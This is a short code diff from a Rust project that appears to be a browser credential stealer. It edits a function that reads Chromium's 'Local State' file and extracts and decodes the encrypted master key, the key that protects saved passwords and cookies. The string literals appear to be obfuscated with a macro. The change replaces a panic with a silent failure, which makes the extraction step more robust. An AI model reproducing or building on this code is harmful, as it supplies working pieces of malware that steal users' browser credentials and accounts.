@@ -134,7 +134,7 @@ unsafe fn utf16_bstrlen(s: *const u16) -> usize {
 
 pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
     let bytes = (user_data / s!("Local State")).read_file().ok()?;
-    let parsed = parse(&bytes).unwrap();
+    let parsed = parse(&bytes).ok()?;
 
     let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
     let key = base64_decode_string(&key_in_base64)?;
